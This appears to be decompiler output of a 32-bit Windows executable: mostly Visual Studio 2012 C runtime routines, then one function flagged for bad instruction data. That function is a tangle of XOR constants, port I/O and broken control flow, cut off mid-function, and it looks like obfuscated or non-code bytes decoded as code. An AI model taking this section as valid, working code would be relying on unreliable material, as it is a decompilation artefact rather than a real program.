// 
// Library: Visual Studio 2012 Release

void __cdecl __exit(int param_1)

{
  _doexit(param_1,1,0);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004174f7(void)

{
  PVOID pvVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  
  pvVar1 = EncodePointer((PVOID)0x0);
  FUN_00418562(pvVar1);
  FUN_00419a55(pvVar1);
  FUN_00417b0e(pvVar1);
  FUN_00419e6d(pvVar1);
  FUN_00419e4f();
  FUN_0041a07e(pvVar1);
  hModule = GetModuleHandleW(L"kernel32.dll");
  pFVar2 = GetProcAddress(hModule,"FlsAlloc");
  DAT_004398a0 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"FlsFree");
  DAT_004398a4 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"FlsGetValue");
  DAT_004398a8 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"FlsSetValue");
  DAT_004398ac = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"InitializeCriticalSectionEx");
  DAT_004398b0 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"CreateEventExW");
  _DAT_004398b4 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"CreateSemaphoreExW");
  _DAT_004398b8 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"SetThreadStackGuarantee");
  DAT_004398bc = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"CreateThreadpoolTimer");
  _DAT_004398c0 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"SetThreadpoolTimer");
  _DAT_004398c4 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"WaitForThreadpoolTimerCallbacks");
  _DAT_004398c8 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"CloseThreadpoolTimer");
  _DAT_004398cc = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"CreateThreadpoolWait");
  _DAT_004398d0 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"SetThreadpoolWait");
  _DAT_004398d4 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"CloseThreadpoolWait");
  _DAT_004398d8 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"FlushProcessWriteBuffers");
  _DAT_004398dc = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"FreeLibraryWhenCallbackReturns");
  _DAT_004398e0 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"GetCurrentProcessorNumber");
  _DAT_004398e4 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"GetLogicalProcessorInformation");
  _DAT_004398e8 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"CreateSymbolicLinkW");
  _DAT_004398ec = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"SetDefaultDllDirectories");
  _DAT_004398f0 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"EnumSystemLocalesEx");
  _DAT_004398f8 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"CompareStringEx");
  _DAT_004398f4 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"GetDateFormatEx");
  _DAT_004398fc = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"GetLocaleInfoEx");
  _DAT_00439900 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"GetTimeFormatEx");
  _DAT_00439904 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"GetUserDefaultLocaleName");
  _DAT_00439908 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"IsValidLocaleName");
  _DAT_0043990c = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"LCMapStringEx");
  _DAT_00439910 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"GetCurrentPackageId");
  DAT_00439914 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"GetTickCount64");
  _DAT_00439918 = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"GetFileInformationByHandleExW");
  _DAT_0043991c = (uint)pFVar2 ^ DAT_00435980;
  pFVar2 = GetProcAddress(hModule,"SetFileInformationByHandleW");
  _DAT_00439920 = (uint)pFVar2 ^ DAT_00435980;
  return;
}



void __cdecl FUN_0041752f(undefined **param_1,undefined **param_2)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = 0;
  uVar2 = ~-(uint)(param_2 < param_1) & (uint)((int)param_2 + (3 - (int)param_1)) >> 2;
  if (uVar2 != 0) {
    do {
      if ((code *)*param_1 != (code *)0x0) {
        (*(code *)*param_1)();
      }
      param_1 = (code **)param_1 + 1;
      uVar1 = uVar1 + 1;
    } while (uVar1 < uVar2);
  }
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



void FUN_00417587(void)

{
  __lock(8);
  return;
}



void FUN_00417590(void)

{
  FUN_00419c57(8);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x004176b9)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _doexit
// 
// Library: Visual Studio 2012 Release

void __cdecl _doexit(int param_1,int param_2,int param_3)

{
  PVOID *ppvVar1;
  PVOID pvVar2;
  code *pcVar3;
  PVOID *ppvVar4;
  PVOID *ppvVar5;
  PVOID *ppvVar6;
  PVOID *local_20;
  
  __lock(8);
  pcVar3 = DecodePointer_exref;
  if (_DAT_004369f0 != 1) {
    _DAT_00436a18 = 1;
    DAT_00436a14 = (undefined)param_3;
    if (param_2 == 0) {
      local_20 = (PVOID *)DecodePointer(DAT_00439930);
      if (local_20 != (PVOID *)0x0) {
        ppvVar1 = (PVOID *)DecodePointer(DAT_0043992c);
        ppvVar6 = ppvVar1;
        while (ppvVar1 = ppvVar1 + -1, local_20 <= ppvVar1) {
          pvVar2 = EncodePointer((PVOID)0x0);
          if (*ppvVar1 != pvVar2) {
            if (ppvVar1 < local_20) break;
            pcVar3 = (code *)(*pcVar3)(*ppvVar1);
            pvVar2 = EncodePointer((PVOID)0x0);
            *ppvVar1 = pvVar2;
            (*pcVar3)();
            pcVar3 = DecodePointer_exref;
            ppvVar4 = (PVOID *)DecodePointer(DAT_00439930);
            ppvVar5 = (PVOID *)DecodePointer(DAT_0043992c);
            if ((local_20 != ppvVar4) || (ppvVar6 != ppvVar5)) {
              ppvVar1 = ppvVar5;
              local_20 = ppvVar4;
              ppvVar6 = ppvVar5;
            }
          }
        }
      }
      FUN_0041752f((undefined **)&DAT_0042845c,(undefined **)&DAT_0042846c);
    }
    FUN_0041752f((undefined **)&DAT_00428470,(undefined **)&DAT_00428474);
  }
  FUN_004176b3();
  if (param_3 == 0) {
    _DAT_004369f0 = 1;
    FUN_00419c57(8);
    ___crtExitProcess(param_1);
    return;
  }
  return;
}



void FUN_004176b3(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_00419c57(8);
  }
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2012 Release

void __cdecl _exit(int _Code)

{
  _doexit(_Code,0,0);
  return;
}



SIZE_T __cdecl FUN_004176dc(LPCVOID param_1)

{
  int *piVar1;
  SIZE_T SVar2;
  
  if (param_1 == (LPCVOID)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00419a8d();
    return 0xffffffff;
  }
  SVar2 = HeapSize(DAT_004369ec,0,param_1);
  return SVar2;
}



int FUN_0041770d(undefined4 param_1,undefined4 param_2)

{
  DWORD DVar1;
  undefined8 uVar2;
  
  DVar1 = 0;
  while( true ) {
    uVar2 = FUN_0041a8da(param_1,param_2);
    if ((int)uVar2 != 0) {
      return (int)uVar2;
    }
    if (DAT_00436a24 == 0) break;
    FUN_004197ff(DVar1);
    DVar1 = DVar1 + 1000;
    if (DAT_00436a24 < DVar1) {
      DVar1 = 0xffffffff;
    }
    if (DVar1 == 0xffffffff) {
      return 0;
    }
  }
  return 0;
}



void * __cdecl FUN_00417755(size_t param_1)

{
  uint uVar1;
  void *pvVar2;
  DWORD DVar3;
  
  DVar3 = 0;
  while( true ) {
    uVar1 = DAT_00436a24;
    pvVar2 = _malloc(param_1);
    if (pvVar2 != (void *)0x0) {
      return pvVar2;
    }
    if (uVar1 == 0) break;
    FUN_004197ff(DVar3);
    DVar3 = DVar3 + 1000;
    if (DAT_00436a24 < DVar3) {
      DVar3 = 0xffffffff;
    }
    if (DVar3 == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



void * __cdecl FUN_0041779c(void *param_1,size_t param_2)

{
  void *pvVar1;
  DWORD DVar2;
  
  DVar2 = 0;
  do {
    pvVar1 = _realloc(param_1,param_2);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (param_2 == 0) {
      return (void *)0x0;
    }
    if (DAT_00436a24 == 0) {
      return (void *)0x0;
    }
    FUN_004197ff(DVar2);
    DVar2 = DVar2 + 1000;
    if (DAT_00436a24 < DVar2) {
      DVar2 = 0xffffffff;
    }
  } while (DVar2 != 0xffffffff);
  return (void *)0x0;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *in_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack28 [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack28 + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack28 + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack28 + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack28 + iVar1 + 4) = DAT_00435980 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack28 + iVar1) = unaff_retaddr;
  *in_FS_OFFSET = (int)local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Library: Visual Studio

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 *in_FS_OFFSET;
  undefined4 unaff_retaddr;
  
  *in_FS_OFFSET = unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



undefined4 __cdecl FUN_00417850(int *param_1,int param_2,undefined4 param_3)

{
  int iVar1;
  code *pcVar2;
  bool bVar3;
  int iVar4;
  int iVar5;
  BOOL BVar6;
  undefined4 uVar7;
  undefined4 extraout_ECX;
  int extraout_EDX;
  int unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *piVar8;
  int *piVar9;
  undefined4 local_10;
  
  bVar3 = false;
  piVar8 = (int *)(*(uint *)(param_2 + 8) ^ DAT_00435980);
  local_10 = 1;
  if (*piVar8 != -2) {
    FUN_0041a954();
  }
  FUN_0041a954();
  if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
    *(undefined **)(param_2 + -4) = &stack0xffffffe4;
    iVar4 = *(int *)(param_2 + 0xc);
    piVar9 = param_1;
    if (*(int *)(param_2 + 0xc) == -2) {
      return 1;
    }
    do {
      iVar1 = piVar8[iVar4 * 3 + 4];
      if (piVar8[iVar4 * 3 + 5] != 0) {
        iVar5 = func_0x0041aa62();
        bVar3 = true;
        if (iVar5 < 0) {
          local_10 = 0;
          goto LAB_0041798b;
        }
        if (0 < iVar5) {
          if ((*param_1 == -0x1f928c9d) &&
             (BVar6 = __IsNonwritableInCurrentImage((PBYTE)&PTR_FUN_0042d68c), BVar6 != 0)) {
            FUN_00423acc(extraout_ECX,extraout_EDX,param_1,1,unaff_EDI,unaff_ESI,unaff_EBX,
                         (int)piVar9,param_3);
          }
          func_0x0041aa92();
          if (*(int *)(param_2 + 0xc) != iVar4) {
            func_0x0041aaab(param_2 + 0x10,&DAT_00435980);
          }
          *(int *)(param_2 + 0xc) = iVar1;
          if (*piVar8 != -2) {
            FUN_0041a954();
          }
          FUN_0041a954();
          func_0x0041aa79();
          pcVar2 = (code *)swi(3);
          uVar7 = (*pcVar2)();
          return uVar7;
        }
      }
      iVar4 = iVar1;
    } while (iVar1 != -2);
    if (!bVar3) {
      return 1;
    }
  }
  else {
    if (*(int *)(param_2 + 0xc) == -2) {
      return 1;
    }
    func_0x0041aaab(param_2 + 0x10,&DAT_00435980);
  }
LAB_0041798b:
  if (*piVar8 != -2) {
    FUN_0041a954();
  }
  FUN_0041a954();
  return local_10;
}



void __cdecl FUN_00417aac(uint param_1,uint param_2)

{
  DAT_00435180 = ~param_2 & DAT_00435180 | param_1 & param_2;
  return;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2012 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  int extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 uVar2;
  byte extraout_DL;
  byte extraout_DL_00;
  byte bVar3;
  undefined2 extraout_DX;
  undefined2 uVar4;
  undefined6 uVar5;
  int iVar6;
  
  uVar5 = FUN_00419e60();
  uVar4 = (undefined2)((uint6)uVar5 >> 0x20);
  iVar6 = extraout_ECX;
  if ((int)uVar5 != 0) {
    iVar6 = 0x16;
    FUN_00419e89(0x16);
    uVar4 = extraout_DX;
  }
  if (((byte)DAT_00435180 & 2) != 0) {
    iVar6 = FUN_00422f06(iVar6,uVar4);
    uVar2 = extraout_ECX_00;
    bVar3 = extraout_DL;
    if (iVar6 != 0) {
      pcVar1 = (code *)swi(0x29);
      (*pcVar1)();
      uVar2 = extraout_ECX_01;
      bVar3 = extraout_DL_00;
    }
    FUN_00419930(uVar2,bVar3,3);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void __cdecl FUN_00417b0e(undefined4 param_1)

{
  DAT_00436a28 = param_1;
  return;
}



undefined8 FUN_00417b20(void)

{
  uint extraout_ECX;
  uint extraout_EDX;
  float10 in_ST0;
  undefined8 uVar1;
  double dVar2;
  
  dVar2 = (double)in_ST0;
  func_0x0041aed8();
  uVar1 = FUN_00417b3d(extraout_ECX,extraout_EDX,SUB84(dVar2,0),(uint)((ulonglong)dVar2 >> 0x20));
  return uVar1;
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x0041b3e7) overlaps instruction at (ram,0x0041b3e6)
// 
// WARNING: Unable to track spacebase fully for stack
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 __fastcall FUN_00417b3d(uint param_1,uint param_2,int param_3,uint param_4)

{
  byte *pbVar1;
  undefined uVar2;
  undefined6 uVar3;
  undefined6 uVar4;
  uint uVar5;
  uint uVar6;
  ulonglong uVar7;
  byte bVar8;
  char cVar9;
  char cVar10;
  char cVar11;
  undefined4 uVar12;
  uint uVar13;
  undefined *puVar14;
  undefined3 uVar18;
  undefined3 uVar19;
  char *pcVar15;
  uint uVar16;
  undefined4 *puVar17;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint uVar20;
  int iVar21;
  uint uVar22;
  uint *puVar23;
  undefined uVar24;
  byte bVar26;
  undefined2 *unaff_EBX;
  uint uVar25;
  uint unaff_EBP;
  uint *unaff_ESI;
  uint uVar27;
  undefined4 *puVar28;
  undefined4 *puVar29;
  undefined *unaff_EDI;
  uint uVar30;
  uint uVar31;
  undefined4 *puVar32;
  undefined2 in_ES;
  undefined2 uVar33;
  bool in_ZF;
  bool bVar34;
  bool bVar35;
  bool bVar36;
  ushort in_FPUControlWord;
  ulonglong uVar37;
  undefined auStack256 [248];
  undefined4 uStack8;
  uint local_4;
  
  uVar37 = CONCAT44(param_2,param_4);
  local_4 = param_2 & 0xffff0000 | (uint)in_FPUControlWord;
  if (in_ZF) {
    if (((param_4 & 0xfffff) != 0) || (param_3 != 0)) {
                    // WARNING: Call to offcut address within same function
      uStack8 = 0x417b97;
      uVar37 = func_0x0041ae7c();
      param_1 = extraout_ECX_00;
      goto LAB_00417bbb;
    }
    uVar16 = param_4 & 0x80000000;
    if (uVar16 != 0) goto LAB_00417bae;
  }
  else {
    if (in_FPUControlWord != 0x27f) {
      uStack8 = 0x417b55;
      uVar37 = FUN_0041ae65(param_1,param_2);
      param_1 = extraout_ECX;
    }
    param_2 = (uint)(uVar37 >> 0x20);
    uVar16 = (uint)uVar37;
    if (((uVar37 & 0x80000000) != 0) &&
       ((((uVar37 & 0x7ff00000) != 0 || ((uVar37 & 0xfffff) != 0)) || (param_3 != 0)))) {
LAB_00417bae:
      uVar37 = CONCAT44(param_2,1);
LAB_00417bbb:
      if (_DAT_00436a2c == 0) {
        uStack8 = 0x417bd8;
        uVar12 = func_0x0041ae07();
        return CONCAT44(local_4,uVar12);
      }
      goto LAB_0041aeec_2;
    }
  }
  uVar37 = CONCAT44(param_2,uVar16);
  if (_DAT_00436a2c == 0) {
    return CONCAT44(5,uVar16);
  }
LAB_0041aeec_2:
  *unaff_EBX = *unaff_EBX;
  uVar7 = uVar37;
  while( true ) {
    _DAT_004353bf = (int)(uVar7 >> 0x20);
    uVar13 = (uint)uVar7;
    uVar16 = ((uint)unaff_EBX ^ (uint)unaff_ESI) << 9;
    uVar20 = ((uint)unaff_EBX ^ (uint)unaff_ESI) >> 0x17;
    uVar22 = _DAT_004353bf + uVar13;
    uVar31 = param_1 >> 0x1c;
    uVar5 = param_1 << 4;
    _DAT_00435960 = uVar31 | uVar5;
    *unaff_ESI = *unaff_ESI ^ 0xa3432f62;
    _DAT_0043575d = uVar16 >> 0x18 | (uVar16 | uVar20) << 8;
    uVar30 = uVar16 & 0xffffff | uVar20;
    _DAT_00435152 = uVar16 & 0xff000000 | uVar30;
    DAT_00435320 = unaff_EDI;
    _DAT_00435b50 = _DAT_0043575d;
    *unaff_ESI = *unaff_ESI + 0xa3432f62;
    _DAT_0043504c = ~_DAT_00435152;
    _DAT_0043548d = unaff_ESI;
    _DAT_00435570 = unaff_EDI;
    _DAT_00435876 = unaff_EDI;
    unique0x10000b90 = _DAT_00435960;
    _DAT_00436293 = _DAT_00435960;
    _DAT_004367a7 = _DAT_00435152;
    *unaff_ESI = ~*unaff_ESI;
    PTR_u_dddd__MMMM_dd__yyyy_00435b00 = (undefined *)((uint)unaff_EDI ^ unaff_EBP ^ 0x113c0b62);
    s___AVout_of_range_std___00436950._16_4_ = uVar31 & 3 | uVar31 & 0xfffffffc | uVar5;
    *unaff_ESI = *unaff_ESI + 0x5cbcd09e;
    _DAT_00435585 = s___AVout_of_range_std___00436950._16_4_;
    PTR_u_Saturday_00435a90 = unaff_EDI;
    s_Copyright__c__1992_2004_by_P_J__P_00436320._87_4_ = s___AVout_of_range_std___00436950._16_4_;
    *unaff_ESI = *unaff_ESI ^ 0xa3432f62;
    _DAT_004369a6 = s___AVout_of_range_std___00436950._16_4_ ^ (uint)unaff_ESI;
    _DAT_00436452 = s___AVout_of_range_std___00436950._16_4_;
    *unaff_ESI = *unaff_ESI + 0x5cbcd09e;
    _DAT_0043578c = (uint)(unaff_ESI + -0x504dea) ^ 0x71363b2;
    _DAT_00435676 = s___AVout_of_range_std___00436950._16_4_;
    _DAT_00436701 = s___AVout_of_range_std___00436950._16_4_;
    s___AVbad_alloc_std___00436818._2_4_ = _DAT_00435152;
    *unaff_ESI = ~*unaff_ESI;
    _DAT_0043509a = s___AVout_of_range_std___00436950._16_4_;
    _DAT_00435428 = uVar13;
    _DAT_00435b40 = s___AVout_of_range_std___00436950._16_4_;
    _DAT_004366c9 = uVar13;
    *unaff_ESI = *unaff_ESI ^ 0xa3432f62;
    _DAT_00435270 = -((uint)unaff_EDI >> 0x15 | (int)unaff_EDI << 0xb);
    *unaff_ESI = *unaff_ESI + 0x5cbcd09e;
    uVar31 = uVar31 & 3 | uVar31 & 0xfffffffc | uVar5 & 0xffff;
    _DAT_00435dd0 = uVar5 & 0xffff0000 | uVar31;
    _DAT_00435be8 = _DAT_00435152;
    _DAT_004366e3 = unaff_EDI;
    *unaff_ESI = *unaff_ESI + 0x5cbcd09e;
    _DAT_004354c0 = ~_DAT_00435dd0;
    uVar30 = uVar30 << 0x10;
    _DAT_004354b4 = uVar30 >> 0x12 | (_DAT_00435152 >> 0x10 | uVar30) << 0xe;
    uVar16 = uVar16 & 0xffff0000;
    uVar25 = uVar16 | (uVar30 & 0xfffc0000 | (uVar20 & 3) << 0x10) >> 0x10;
    puVar23 = (uint *)((uint)unaff_ESI ^ _DAT_00435152 ^ uVar25);
    uVar25 = (uVar13 + _DAT_00435152) - uVar25;
    *puVar23 = ~*puVar23;
    uVar27 = ((uVar22 ^ uVar13) + uVar25 ^ uVar25) - uVar25;
    PTR_DAT_00435224 = (undefined *)(uVar27 ^ 0xe895174);
    uVar13 = uVar16 | (uVar30 & 0xffc00000) >> 0x10;
    uVar22 = uVar20 & 0x3f | uVar13;
    uVar20 = uVar5 & 0x7fff0000 | uVar31 | uVar5 & 0x80000000;
    unaff_ESI = (uint *)((uint)(puVar23 + 1) ^ _DAT_00435dd0 ^ uVar20);
    uVar27 = ((uVar27 + uVar25 ^ uVar25) - uVar25) - 4;
    if (uVar27 == 0) break;
    _DAT_00435290 = uVar20;
    *unaff_ESI = ~*unaff_ESI;
    param_1 = uVar31 << 0x1c | uVar20 >> 4;
    _DAT_00435920 = (uVar27 ^ uVar25) - uVar25;
    uVar7 = CONCAT44(_DAT_00435920,uVar25);
    unaff_EBX = (undefined2 *)((uVar13 >> 9 | uVar22 << 0x17) ^ (uint)unaff_ESI);
    s_Copyright__c__1992_2004_by_P_J__P_00436320._48_4_ = unaff_EDI;
    unique0x10000bc8 = unaff_ESI;
  }
  uVar33 = SUB42(unaff_ESI,0);
  uVar13 = in(uVar33);
  bVar35 = (uVar37 & 0x400) != 0;
  uVar25 = uVar13 & 0xffffff00 | (uint)(byte)((char)uVar13 + 0xba);
  uVar24 = (undefined)uVar22;
  uVar30 = (uint)(byte)((char)(uVar30 >> 0x18) - 0x22);
  uVar31 = (uint)CONCAT11((char)(unaff_EDI + -0x29abeefc) + -8,uVar24);
  uVar27 = uVar16 | uVar31;
  uVar22 = (uint)(unaff_EDI + -0x29abeefc) & 0xffffff00 | 0xa4;
  PTR_PTR_FUN_00436618 = unaff_EDI;
  do {
    puVar14 = (undefined *)(uVar30 & 0xffffff00 | (uint)(byte)((char)uVar30 + 0x78));
    uVar6 = uVar22 & 0xffffff00 | (uint)DAT_3bdecebe;
    puVar23 = (uint *)(puVar14 + uVar6 + 0x9d9390fc);
    uVar22 = (uint)(0xf < (byte)((char)uVar22 + 0x18U));
    uVar30 = *puVar23;
    bVar36 = CARRY4((uint)(puVar14 + *puVar23),uVar22);
    *puVar23 = (uint)(puVar14 + *puVar23 + uVar22);
    bVar34 = *puVar23 == 0;
    uVar2 = in(uVar33);
    *puVar14 = uVar2;
    bVar8 = (byte)((short)((short)register0x00000010 + -3) / (short)*(char *)(uVar27 - 0x5a));
    if (bVar34) {
      puVar23 = (uint *)(uVar20 + 0x8037a4f6);
      *puVar23 = *puVar23 << 1 | (uint)((int)*puVar23 < 0);
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    bVar26 = (byte)(uVar31 >> 8);
    if ((!CARRY4(uVar30,(uint)puVar14) && !bVar36) && !bVar34) {
      if (!SBORROW1((char)((uint)unaff_ESI >> 8),bVar26)) {
        pbVar1 = (byte *)(uVar25 + uVar27 * 8);
        *pbVar1 = *pbVar1 << 7 | *pbVar1 >> 1;
        *(undefined4 *)(uVar25 + unaff_EBP) = 0xde04c515;
        pbVar1 = (byte *)(uVar25 + uVar27 * 8);
        *pbVar1 = *pbVar1 << 7 | *pbVar1 >> 1;
        uVar3 = *(undefined6 *)(uVar25 + uVar27 * 8);
        pbVar1 = (byte *)(uVar25 + uVar27 * 8);
        *pbVar1 = *pbVar1 << 5 | *pbVar1 >> 3;
        *(undefined4 *)(uVar20 + uVar27 * 8) = 0xde04c687;
        puVar23 = (uint *)((uint)uVar3 & 0xffffff00 | (uint)(byte)((char)uVar3 - 0x22));
        uVar31 = (uVar13 & 0xffffff00 | (uint)(byte)((char)uVar13 + 0x98)) + 4 + (uint)bVar35 * -8;
        puVar28 = (undefined4 *)
                  (((uint)auStack256 & 0xffff0000 | (uint)(bVar8 / 0xde) << 8 |
                   (uint)(byte)(bVar8 % 0xde - 0x27)) + 4 + (uint)bVar35 * -8);
        puVar28[uVar27 * 2] = 0xde04c60b;
        uVar30 = *puVar23;
        *puVar23 = uVar31 & 0xffffff00 | (uint)(byte)((char)uVar31 - 0x24);
        *(uint **)(uVar6 - 4) = puVar23;
        uVar30 = uVar30 + 0x45787de & 0xffffff00 | (uint)(byte)((char)(uVar30 + 0x45787de) - 0x22);
        puVar17 = puVar28 + uVar27 * 2;
        *(byte *)puVar17 = *(char *)puVar17 << 7 | *(byte *)puVar17 >> 1;
        *(undefined4 *)((int)puVar28 + unaff_EBP * 2) = 0x7e04c786;
        uVar3 = *(undefined6 *)((uVar6 - 4) + unaff_EBP * 4);
        cVar11 = (char)uVar3;
        iVar21 = (uint)CONCAT21((short)(uVar20 >> 0x10),(char)((uVar5 & 0xffff) >> 8) - cVar11) << 8
        ;
        uVar16 = uVar16 | CONCAT11(bVar26 + 8,uVar24);
        cVar11 = cVar11 + 'B';
        uVar18 = (int3)((uint6)uVar3 >> 8);
        do {
          do {
            cVar9 = cVar11;
            puVar28[uVar16 * 2] = 0xde04c787;
            cVar10 = (char)uVar30;
            out(0xc6,uVar30 & 0xffffff00 | (uint)(byte)(cVar10 + 0xbc));
            uVar24 = (undefined)uVar16;
            uVar20 = uVar16 & 0xffff0000;
            uVar3 = *(undefined6 *)(puVar28 + CONCAT31(uVar18,cVar9 + '\x12') * 2);
            uVar33 = (undefined2)((uint6)uVar3 >> 0x20);
            uVar31 = (uint)CONCAT11((char)uVar3,uVar24);
            uVar16 = uVar20 | uVar31;
            uVar19 = (undefined3)((uint6)uVar3 >> 8);
            uVar30 = CONCAT31(uVar18,cVar9 + -0x54);
            cVar11 = cVar10 + -0x10;
            uVar18 = uVar19;
          } while (cVar11 == '\0');
        } while (SCARRY1(cVar10 + -0x60,'P') != cVar11 < '\0');
        uVar16 = uVar20 | CONCAT11(cVar11,uVar24);
        pcVar15 = (char *)CONCAT31(uVar19,(char)(uVar31 >> 8) + 'P');
        *(undefined2 *)(uVar6 - 8) = in_ES;
        *(undefined *)(puVar28 + uVar16 * 2) = 0x97;
        puVar17 = puVar28 + uVar16 * 2;
        *(byte *)puVar17 = *(char *)puVar17 << 3 | *(byte *)puVar17 >> 5;
        puVar17 = puVar28 + uVar16 * 2;
        *(byte *)puVar17 = *(char *)puVar17 << 3 | *(byte *)puVar17 >> 5;
        *(undefined *)(puVar28 + uVar16 * 2) = 0x87;
        puVar28[uVar16 * 2] = 0xde04c787;
        uVar20 = uVar20 | CONCAT11((char)((uint)CONCAT11(cVar11,uVar24) >> 8) + -0x5c,uVar24);
        puVar32 = (undefined4 *)(pcVar15 + (uint)bVar35 * -2 + 1);
        *pcVar15 = cVar9 + 'j';
        puVar17 = puVar32 + (uint)bVar35 * -2 + 1;
        puVar29 = puVar28 + (uint)bVar35 * -2 + 1;
        *puVar32 = *puVar28;
        do {
          *(undefined2 *)(unaff_EBP - 0x3a) = uVar33;
          uVar3 = *(undefined6 *)(puVar29 + uVar20 * 2);
          uVar30 = (uint)uVar3;
          puVar28 = puVar29 + uVar30 * 2;
          *(byte *)puVar28 = *(char *)puVar28 << 7 | *(byte *)puVar28 >> 1;
          cVar11 = (char)*(undefined6 *)(puVar29 + uVar30 * 2);
          uVar16 = (uint)*(undefined6 *)(puVar29 + uVar30 * 2) & 0xffffff00;
          uVar24 = (undefined)uVar3;
          uVar30 = uVar30 & 0xffff0000;
          uVar20 = uVar30 | CONCAT11((char)puVar17 + -4,uVar24);
          uVar4 = *(undefined6 *)
                   (((uint)puVar17 & 0xffffff00 | (uint)(byte)((uint6)uVar3 >> 8)) + 100);
          in(0x78);
          *(char *)((int)puVar29 + -0x546dfb39) = *(char *)((int)puVar29 + -0x546dfb39) + '\x01';
          puVar17 = puVar29 + uVar20 * 2;
          *(byte *)puVar17 = *(char *)puVar17 << 7 | *(byte *)puVar17 >> 1;
          uVar3 = *(undefined6 *)(puVar29 + uVar20 * 2);
          uVar33 = (undefined2)((uint6)uVar3 >> 0x20);
          puVar29[uVar20 * 2] = 0xde04c51b;
          iVar21 = CONCAT31((int3)((uint)iVar21 >> 8),0x76);
